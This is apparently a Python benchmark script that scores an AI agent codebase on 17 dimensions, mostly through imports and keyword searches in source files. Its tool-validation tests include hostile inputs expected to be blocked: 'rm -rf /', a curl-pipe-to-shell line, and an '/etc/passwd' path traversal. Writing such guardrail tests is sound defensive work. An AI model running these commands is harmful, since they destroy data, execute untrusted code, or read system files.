#!/usr/bin/env python
"""Agent 7-dimension evaluation benchmark script.

Standalone runnable benchmark for Harness Engineering quality assessment.
Usage: python tests/benchmark_harness.py

Also provides a pytest-compatible TestBenchmark class for CI integration.
"""
import os
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
os.environ.setdefault("TEST_MODE", "true")  # B1: 避免测试日志污染生产日志

# ── Project root and file lists ──────────────────────────────
_PROJECT_ROOT = Path(__file__).resolve().parent.parent

_MODIFIED_FILES = [
    "agent_core/message_processor.py",
    "tool_engine/tool_call_handler.py",
    "tool_engine/tool_guardrails.py",
    "tool_engine/tool_executor.py",
    "prompt_builder.py",
    "xiaoli_agent.py",
    "agent_dispatcher.py",
    "config.py",
    "agent_context.py",
]

_TIMEOUT_FILES = [
    "xiaoli_agent.py",
    "tool_engine/tool_call_handler.py",
    "agent_core/message_processor.py",
]


def _read_file(name: str) -> str:
    """Read a project file with utf-8 encoding."""
    return (_PROJECT_ROOT / name).read_text(encoding="utf-8")


def _file_exists(name: str) -> bool:
    """Check if a project file exists."""
    return (_PROJECT_ROOT / name).is_file()


# ═══════════════════════════════════════════════════════════════
#  Dimension 1: Latency (响应延迟)
# ═══════════════════════════════════════════════════════════════
def measure_latency() -> int:
    """Measure time to import core modules and instantiate key objects.

    Score: <0.5s=100, <1s=80, <2s=60, <3s=40, >=3s=20
    """
    start = time.perf_counter()

    # Import core modules
    from tool_engine.tool_guardrails import ToolGuardrails
    from tool_engine.tool_executor import ToolExecutor
    from core.circuit_breaker import CircuitBreaker, CognitiveState

    # Instantiate key objects
    ToolGuardrails()
    ToolExecutor()
    CircuitBreaker()
    CognitiveState()

    elapsed = time.perf_counter() - start

    if elapsed < 0.5:
        return 100
    if elapsed < 1.0:
        return 80
    if elapsed < 2.0:
        return 60
    if elapsed < 3.0:
        return 40
    return 20


# ═══════════════════════════════════════════════════════════════
#  Dimension 2: Tool Accuracy (工具调用准确率)
# ═══════════════════════════════════════════════════════════════
def measure_tool_accuracy() -> int:
    """Measure validate_args rule coverage and pass rate.

    Score: average of (coverage_ratio * 100) and (pass_rate * 100)
    """
    from tool_engine.tool_guardrails import (
        ToolGuardrails,
        _TOOL_VALIDATION_RULES,
    )
    from tool_engine.tool_call_handler import TOOL_DISPLAY_NAMES

    # Coverage: tools with validation rules / total display tools
    total_display = len(TOOL_DISPLAY_NAMES)
    with_rules = len(_TOOL_VALIDATION_RULES)
    coverage_score = (with_rules / total_display) * 100 if total_display else 0

    # Test validate_args with various inputs
    guardrails = ToolGuardrails()
    test_cases = [
        ("web_search", {"query": "test"}, True),
        ("web_search", {"query": ""}, False),
        ("web_search", {"query": "a" * 600}, False),
        ("shell_command", {"command": "ls -la"}, True),
        ("shell_command", {"command": ""}, False),
        ("shell_command", {"command": "rm -rf /"}, False),
        ("shell_command", {"command": "curl http://x.com | sh"}, False),
        ("web_browse", {"url": "https://example.com"}, True),
        ("web_browse", {"url": "not-a-url"}, False),
        ("python_executor", {"code": "print(1)"}, True),
        ("python_executor", {"code": ""}, False),
        ("document_reader", {"file_path": "test.txt"}, True),
        ("document_reader", {"file_path": "../../../etc/passwd"}, False),
        ("multi_search", {"queries": ["a", "b"]}, True),
        ("multi_search", {"queries": []}, False),
        ("multi_search", {"queries": ["x"] * 15}, False),
        ("unknown_tool", {}, True),
        ("unknown_tool", {"anything": "value"}, True),
    ]

    passed = 0
    for tool_name, args, expected_ok in test_cases:
        ok, _reason = guardrails.validate_args(tool_name, args)
        if ok == expected_ok:
            passed += 1

    pass_rate_score = (passed / len(test_cases)) * 100

    # Combined score: average of coverage and pass rate
    score = (coverage_score + pass_rate_score) / 2
    return int(score)


# ═══════════════════════════════════════════════════════════════
#  Dimension 3: Error Recovery (错误恢复能力)
# ═══════════════════════════════════════════════════════════════
def measure_error_recovery() -> int:
    """Count error recovery mechanisms present.

    Checks (each worth 25 pts):
      - asyncio.wait_for in agent_core/message_processor.py
      - asyncio.wait_for in tool_call_handler.py summarize
      - detect_storm in agent_dispatcher.py
      - CircuitBreaker state machine (GREEN/YELLOW/RED/HALF_OPEN)
    """
    score = 0

    # Check 1: asyncio.wait_for in agent_core/message_processor.py (25 pts)
    agent_content = _read_file("agent_core/message_processor.py")
    if "asyncio.wait_for" in agent_content:
        score += 25

    # Check 2: asyncio.wait_for in tool_call_handler.py summarize (25 pts)
    tch_content = _read_file("tool_engine/tool_call_handler.py")
    if "asyncio.wait_for" in tch_content and "_summarize_results" in tch_content:
        score += 25

    # Check 3: detect_storm in agent_dispatcher.py (25 pts)
    disp_content = _read_file("agent_dispatcher.py")
    if "detect_storm" in disp_content:
        score += 25

    # Check 4: CircuitBreaker state machine (25 pts)
    from core.circuit_breaker import CircuitState
    state_values = {
        CircuitState.GREEN,
        CircuitState.YELLOW,
        CircuitState.RED,
        CircuitState.HALF_OPEN,
    }
    if len(state_values) == 4:
        score += 25

    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 4: Context Quality (上下文质量)
# ═══════════════════════════════════════════════════════════════
def measure_context_quality() -> int:
    """Test scene-aware classification accuracy on 10 inputs.

    Score: (correct / 10) * 100
    """
    from prompt_builder import _classify_scene

    test_cases = [
        ("你好呀", "greeting"),
        ("早上好", "greeting"),
        ("帮我写个脚本", "task"),
        ("如何配置", "task"),
        ("今天好开心", "emotional"),
        ("好难过", "emotional"),
        ("你是谁", "identity"),
        ("查天气怎么样", "tool"),
        ("搜一下", "tool"),
        ("random xyz", "default"),
    ]

    correct = 0
    for text, expected in test_cases:
        result = _classify_scene(text)
        if result == expected:
            correct += 1

    return int((correct / len(test_cases)) * 100)


# ═══════════════════════════════════════════════════════════════
#  Dimension 5: Loop Safety (循环安全性)
# ═══════════════════════════════════════════════════════════════
def measure_loop_safety() -> int:
    """Verify verification loop safety constants.

    Checks (each worth ~33 pts):
      - MAX_VERIFICATION_TURNS == 8 (33 pts)
      - VERIFICATION_WALL_TIMEOUT == 50 (33 pts)
      - MAX_CONSECUTIVE_TOOL_FAILURES == 3 (34 pts)
    """
    from agent_core.message_processor import MessageProcessorMixin

    score = 0
    if MessageProcessorMixin.MAX_VERIFICATION_TURNS == 8:
        score += 33
    if MessageProcessorMixin.VERIFICATION_WALL_TIMEOUT == 50:
        score += 33
    if MessageProcessorMixin.MAX_CONSECUTIVE_TOOL_FAILURES == 3:
        score += 34

    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 6: Cross-Platform (跨平台兼容)
# ═══════════════════════════════════════════════════════════════
def measure_cross_platform() -> int:
    """Check Windows compatibility across modified files.

    Checks: For each of 9 modified files:
      - No signal.SIGKILL (9 files)
      - No os.fork() (9 files)
      - No Unix-only imports (9 files)
    Plus: asyncio.wait_for in timeout files (3 files)
    Score: (passed_checks / total_checks) * 100
    """
    unix_import_patterns = [
        re.compile(r"^\s*import\s+fcntl\b", re.MULTILINE),
        re.compile(r"^\s*import\s+termios\b", re.MULTILINE),
        re.compile(r"^\s*import\s+grp\b", re.MULTILINE),
        re.compile(r"^\s*import\s+pwd\b", re.MULTILINE),
        re.compile(r"^\s*from\s+fcntl\b", re.MULTILINE),
        re.compile(r"^\s*from\s+termios\b", re.MULTILINE),
        re.compile(r"^\s*from\s+grp\b", re.MULTILINE),
        re.compile(r"^\s*from\s+pwd\b", re.MULTILINE),
    ]

    total_checks = 0
    passed_checks = 0

    for name in _MODIFIED_FILES:
        if not _file_exists(name):
            continue
        content = _read_file(name)

        # Check 1: No signal.SIGKILL
        total_checks += 1
        if "signal.SIGKILL" not in content and "SIGKILL" not in content:
            passed_checks += 1

        # Check 2: No os.fork()
        total_checks += 1
        if not re.search(r"os\.fork\s*\(", content):
            passed_checks += 1

        # Check 3: No Unix-only imports
        total_checks += 1
        has_unix_import = any(pat.search(content) for pat in unix_import_patterns)
        if not has_unix_import:
            passed_checks += 1

    # Check 4: asyncio.wait_for present in timeout files
    for name in _TIMEOUT_FILES:
        if not _file_exists(name):
            continue
        content = _read_file(name)
        total_checks += 1
        if "asyncio.wait_for" in content:
            passed_checks += 1

    return int((passed_checks / total_checks) * 100) if total_checks else 0


# ═══════════════════════════════════════════════════════════════
#  Dimension 7: Robustness (代码健壮性)
# ═══════════════════════════════════════════════════════════════
def measure_robustness() -> int:
    """Measure exception handling coverage in modified files.

    For each modified file, count lines with try: or except,
    divide by total lines * 10, cap at 100.
    Also check DEGRADED_REPLY fallback and asyncio.TimeoutError handling.
    """
    try_except_pattern = re.compile(r"^\s*(try\b\s*:|except\b)")

    file_scores = []
    for name in _MODIFIED_FILES:
        if not _file_exists(name):
            continue
        content = _read_file(name)
        lines = content.splitlines()
        total_lines = len(lines)
        if total_lines == 0:
            continue

        try_except_count = sum(
            1 for line in lines if try_except_pattern.match(line)
        )

        # Per-file score: (try_except_count / total_lines) * 1000, capped at 100
        file_score = min(100, (try_except_count / total_lines) * 1000)
        file_scores.append(file_score)

    base_score = sum(file_scores) / len(file_scores) if file_scores else 0

    # Bonus checks
    bonus = 0

    # Check: DEGRADED_REPLY exists as fallback
    for name in ("tool_engine/tool_call_handler.py", "agent_core/core.py"):
        if _file_exists(name):
            content = _read_file(name)
            if "DEGRADED_REPLY" in content:
                bonus += 20
                break

    # Check: asyncio.TimeoutError handled in key files
    timeout_error_files = 0
    for name in _TIMEOUT_FILES:
        if _file_exists(name):
            content = _read_file(name)
            if "asyncio.TimeoutError" in content:
                timeout_error_files += 1
    if timeout_error_files >= 2:
        bonus += 20

    score = min(100, base_score + bonus)
    return int(score)


# ═══════════════════════════════════════════════════════════════
#  Dimension 8: Tool Interface V2 (工具接口规范)
# ═══════════════════════════════════════════════════════════════
def measure_tool_interface_v2() -> int:
    """Measure tool interface V2 compliance.

    Checks (each worth 20 pts):
      - tool_wrapper.py exists with validate_file_path
      - tool_wrapper.py has validate_tool_params
      - tool_wrapper.py has ToolResultV2 class
      - register_tool has model_overrides parameter
      - register_tool has schema_v2 parameter
    """
    score = 0

    if _file_exists("tool_engine/tool_wrapper.py"):
        content = _read_file("tool_engine/tool_wrapper.py")
        if "def validate_file_path" in content:
            score += 20
        if "def validate_tool_params" in content:
            score += 20
        if "class ToolResultV2" in content:
            score += 20

    if _file_exists("tool_engine/tool_registry.py"):
        content = _read_file("tool_engine/tool_registry.py")
        if "model_overrides" in content:
            score += 20
        if "schema_v2" in content:
            score += 20

    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 9: Orchestration Phasing (编排阶段化)
# ═══════════════════════════════════════════════════════════════
def measure_orchestration_phasing() -> int:
    """Measure orchestration loop phase decomposition.

    Checks (each worth 25 pts):
      - ws_hub.py has PLAN phase (_classify_scene call)
      - ws_hub.py has EXECUTE phase logging
      - ws_hub.py has VERIFY phase (_verify_response)
      - ws_hub.py has tool error loop detection
    """
    score = 0

    if _file_exists("web/ws_hub.py"):
        content = _read_file("web/ws_hub.py")
        if "_classify_scene" in content and "phase" in content and "plan" in content:
            score += 25
        if "phase" in content and "execute" in content:
            score += 25
        if "_verify_response" in content:
            score += 25
        if "tool_error_loop" in content or "error_loop" in content:
            score += 25

    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 10: Retry & Loop Detection (重试与循环检测)
# ═══════════════════════════════════════════════════════════════
def measure_retry_mechanism() -> int:
    """Measure retry and loop detection in tool_executor.

    Checks (each worth 20 pts):
      - MAX_RETRIES constant exists
      - Exponential backoff (RETRY_BASE_DELAY / RETRY_MAX_DELAY)
      - _is_retryable_error method exists
      - Failure streak tracking (_failure_streaks)
      - FAILURE_STREAK_THRESHOLD constant
    """
    score = 0

    if _file_exists("tool_engine/tool_executor.py"):
        content = _read_file("tool_engine/tool_executor.py")
        if "MAX_RETRIES" in content:
            score += 20
        if "RETRY_BASE_DELAY" in content and "RETRY_MAX_DELAY" in content:
            score += 20
        if "_is_retryable_error" in content:
            score += 20
        if "_failure_streaks" in content:
            score += 20
        if "FAILURE_STREAK_THRESHOLD" in content:
            score += 20

    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 11: Query Cache (查询语义缓存)
# ═══════════════════════════════════════════════════════════════
def measure_query_cache() -> int:
    """Measure QueryCache semantic cache completeness.

    Checks (each worth 20 pts):
      - memory/query_cache.py exists with QueryCache class
      - Has get/put/invalidate methods
      - Has threshold + LRU (max_size, popitem(last=False))
      - Has TTL expiry check
      - Has stats property (hits/misses/size)
    """
    score = 0
    if not _file_exists("memory/query_cache.py"):
        return 0
    content = _read_file("memory/query_cache.py")
    if "class QueryCache" in content:
        score += 20
    if "async def get" in content and "async def put" in content \
            and "def invalidate" in content:
        score += 20
    if "threshold" in content and "max_size" in content \
            and "popitem(last=False)" in content:
        score += 20
    if "_ttl" in content and ("now - entry" in content or "ttl" in content):
        score += 20
    if "def stats" in content and "hits" in content and "misses" in content:
        score += 20
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 12: HyDE Enhancement (HyDE 向量混合)
# ═══════════════════════════════════════════════════════════════
def measure_hyde_enhancement() -> int:
    """Measure HyDE document generation feature.

    Checks (each worth 25 pts):
      - generate_hyde_document method exists in query_transform.py
      - Has 5s timeout (asyncio.wait_for, timeout=5)
      - Returns None when no API key (degrade)
      - Catches TimeoutError and Exception
    """
    score = 0
    if not _file_exists("memory/query_transform.py"):
        return 0
    content = _read_file("memory/query_transform.py")
    if "async def generate_hyde_document" in content:
        score += 25
    if "asyncio.wait_for" in content and "timeout=5" in content:
        score += 25
    if "not self._available" in content and "return None" in content:
        score += 25
    if "asyncio.TimeoutError" in content or "TimeoutError" in content:
        score += 25
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 13: Intent Routing (意图路由准确率)
# ═══════════════════════════════════════════════════════════════
def measure_intent_routing() -> int:
    """Measure intent classification routing feature.

    Checks (each worth 20 pts):
      - classify_intent method exists
      - Supports 4 intents: temporal / factual / chat / multi-hop
      - Has rule-based keyword fast path (TEMPORAL_KEYWORDS etc.)
      - Has LLM fallback path
      - Default fallback returns factual
    """
    score = 0
    if not _file_exists("memory/query_transform.py"):
        return 0
    content = _read_file("memory/query_transform.py")
    if "async def classify_intent" in content:
        score += 20
    required_intents = ["temporal", "factual", "chat", "multi-hop"]
    if all(intent in content for intent in required_intents):
        score += 20
    if "TEMPORAL_KEYWORDS" in content and "CHAT_KEYWORDS" in content \
            and "MULTIHOP_KEYWORDS" in content:
        score += 20
    if "self._available" in content and "_call_free_model" in content:
        score += 20
    if 'return "factual"' in content:
        score += 20
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 14: CRAG Assessor (CRAG 评估器)
# ═══════════════════════════════════════════════════════════════
def measure_crag_assessor() -> int:
    """Measure CRAG retrieval assessor feature.

    Checks (each worth 20 pts):
      - memory/retrieval_assessor.py exists with RetrievalAssessor class
      - Has assess method returning confidence/level/should_retry/should_fallback
      - Has HIGH_THRESHOLD / LOW_THRESHOLD constants
      - Has empty/low/medium/high level classification
      - Has stats tracking property
    """
    score = 0
    if not _file_exists("memory/retrieval_assessor.py"):
        return 0
    content = _read_file("memory/retrieval_assessor.py")
    if "class RetrievalAssessor" in content:
        score += 20
    if "def assess" in content and "confidence" in content \
            and "should_retry" in content and "should_fallback" in content:
        score += 20
    if "HIGH_THRESHOLD" in content and "LOW_THRESHOLD" in content:
        score += 20
    if '"empty"' in content and '"low"' in content and '"high"' in content:
        score += 20
    if "def stats" in content and "total_assessments" in content:
        score += 20
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 15: KG Parallel Recall (KG 并行召回)
# ═══════════════════════════════════════════════════════════════
def measure_kg_parallel_recall() -> int:
    """Measure KG parallel recall in retrieve_memories_hybrid.

    Checks (each worth 20 pts):
      - retrieve_memories_hybrid method exists with use_kg parameter
      - asyncio.gather for FTS + Vector + KG parallel execution
      - KG recall coroutine defined (_kg_recall or similar)
      - RRF fusion merging three channels
      - KG failure gracefully degrades (try/except returning [])
    """
    score = 0
    if not _file_exists("memory/memory_manager.py"):
        return 0
    content = _read_file("memory/memory_manager.py")
    if "async def retrieve_memories_hybrid" in content and "use_kg" in content:
        score += 20
    if "asyncio.gather" in content:
        score += 20
    if "_kg_recall" in content or "kg_recall" in content:
        score += 20
    if "rrf" in content.lower() or "RRF" in content:
        score += 20
    if "except Exception" in content and "return []" in content:
        score += 20
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 16: Unified Scoring (统一评分框架)
# ═══════════════════════════════════════════════════════════════
def measure_unified_scoring() -> int:
    """Measure unified scoring framework.

    Checks (each worth 20 pts):
      - _normalize_score function exists in memory_manager.py
      - Handles None / non-numeric inputs gracefully
      - Unified scoring formula: rerank*0.5 + fluid*0.3 + kg*0.1 + recency*0.1
      - Writes intermediate score fields (rerank_score, fluid_score, kg_boost, recency_boost)
      - final_score field written
    """
    score = 0
    if not _file_exists("memory/memory_manager.py"):
        return 0
    content = _read_file("memory/memory_manager.py")
    if "def _normalize_score" in content:
        score += 20
    if "TypeError" in content and "ValueError" in content:
        score += 20
    if ("rerank_score * 0.5" in content or "rerank_score*0.5" in content) \
            and "fluid_score * 0.3" in content \
            and "kg_boost * 0.1" in content \
            and "recency_boost * 0.1" in content:
        score += 20
    if 'r["rerank_score"]' in content and 'r["fluid_score"]' in content \
            and 'r["kg_boost"]' in content and 'r["recency_boost"]' in content:
        score += 20
    if 'r["final_score"]' in content:
        score += 20
    return score


# ═══════════════════════════════════════════════════════════════
#  Dimension 17: Candidate Control (候选集大小控制)
# ═══════════════════════════════════════════════════════════════
def measure_candidate_control() -> int:
    """Measure candidate set size control feature.

    Checks (each worth 25 pts):
      - RAG_RECALL_LIMIT defined in config.py
      - RAG_RERANK_LIMIT defined in config.py
      - retrieve_memories_hybrid reads RAG_RECALL_LIMIT via getattr
      - Intent-based k value routing (use_kg parameter usage)
    """
    score = 0
    if not _file_exists("config.py"):
        return 0
    config_content = _read_file("config.py")
    if "RAG_RECALL_LIMIT" in config_content:
        score += 25
    if "RAG_RERANK_LIMIT" in config_content:
        score += 25

    if _file_exists("memory/memory_manager.py"):
        mm_content = _read_file("memory/memory_manager.py")
        if "RAG_RECALL_LIMIT" in mm_content and "getattr" in mm_content:
            score += 25
        if "use_kg" in mm_content:
            score += 25
    return score


# ═══════════════════════════════════════════════════════════════
#  Report Generation
# ═══════════════════════════════════════════════════════════════
# 维度标签顺序（保持原有 10 维 + 新增 7 维 RAG 优化）
_DIMENSION_LABELS = [
    ("1. 响应延迟 (Latency)", "latency"),
    ("2. 工具准确率 (Tool Accuracy)", "tool_accuracy"),
    ("3. 错误恢复 (Error Recovery)", "error_recovery"),
    ("4. 上下文质量 (Context Quality)", "context_quality"),
    ("5. 循环安全性 (Loop Safety)", "loop_safety"),
    ("6. 跨平台兼容 (Cross-Platform)", "cross_platform"),
    ("7. 代码健壮性 (Robustness)", "robustness"),
    ("8. 工具接口V2 (Tool Interface V2)", "tool_interface_v2"),
    ("9. 编排阶段化 (Orchestration)", "orchestration_phasing"),
    ("10. 重试与循环检测 (Retry)", "retry_mechanism"),
    ("11. 查询语义缓存 (Query Cache)", "query_cache"),
    ("12. HyDE 向量混合 (HyDE)", "hyde_enhancement"),
    ("13. 意图路由 (Intent Routing)", "intent_routing"),
    ("14. CRAG 评估器 (CRAG Assessor)", "crag_assessor"),
    ("15. KG 并行召回 (KG Parallel Recall)", "kg_parallel_recall"),
    ("16. 统一评分 (Unified Scoring)", "unified_scoring"),
    ("17. 候选集控制 (Candidate Control)", "candidate_control"),
]


def run_all_dimensions() -> dict:
    """Run all 17 dimensions and return scores dict."""
    return {
        "latency": measure_latency(),
        "tool_accuracy": measure_tool_accuracy(),
        "error_recovery": measure_error_recovery(),
        "context_quality": measure_context_quality(),
        "loop_safety": measure_loop_safety(),
        "cross_platform": measure_cross_platform(),
        "robustness": measure_robustness(),
        "tool_interface_v2": measure_tool_interface_v2(),
        "orchestration_phasing": measure_orchestration_phasing(),
        "retry_mechanism": measure_retry_mechanism(),
        "query_cache": measure_query_cache(),
        "hyde_enhancement": measure_hyde_enhancement(),
        "intent_routing": measure_intent_routing(),
        "crag_assessor": measure_crag_assessor(),
        "kg_parallel_recall": measure_kg_parallel_recall(),
        "unified_scoring": measure_unified_scoring(),
        "candidate_control": measure_candidate_control(),
    }


def _rating(average: float) -> str:
    """Determine rating based on average score."""
    if average >= 90:
        return "S"
    if average >= 80:
        return "A"
    if average >= 70:
        return "B"
    if average >= 60:
        return "C"
    return "D"


def print_report(scores: dict):
    """Print the benchmark report in the specified format."""
    dimensions = [(label, scores[key]) for label, key in _DIMENSION_LABELS]
    num_dims = len(dimensions)
    total = sum(scores.values())
    max_total = num_dims * 100
    average = total / num_dims

    print()
    print("=" * 52)
    print("  Harness Engineering 评测报告")
    print("=" * 52)
    print()
    print(f"{'维度':<36}{'分数':>8}")
    print("-" * 52)
    for label, score in dimensions:
        print(f"{label:<36}{score:>5}/100")
    print("-" * 52)
    print(f"{'总分':<36}{total:>5}/{max_total}")
    print(f"{'平均分':<36}{average:>5.0f}/100")
    print()
    print(f"评级: {_rating(average)}")
    print()


# ═══════════════════════════════════════════════════════════════
#  Main Entry Point
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    scores = run_all_dimensions()
    print_report(scores)


# ═══════════════════════════════════════════════════════════════
#  pytest-compatible Test Class
# ═══════════════════════════════════════════════════════════════
class TestBenchmark:
    """pytest-compatible test class for benchmark assertions.

    Asserts total average score >= 80 and no dimension < 60.
    """

    def test_total_score_above_80(self):
        """Average score across all dimensions should be >= 80."""
        scores = run_all_dimensions()
        num_dims = len(scores)
        average = sum(scores.values()) / num_dims
        assert average >= 80, (
            f"Average score {average:.1f} is below 80. "
            f"Scores: {scores}"
        )

    def test_no_dimension_below_60(self):
        """No single dimension should score below 60."""
        scores = run_all_dimensions()
        low_dims = {
            k: v for k, v in scores.items() if v < 60
        }
        assert not low_dims, (
            f"Dimensions below 60: {low_dims}"
        )
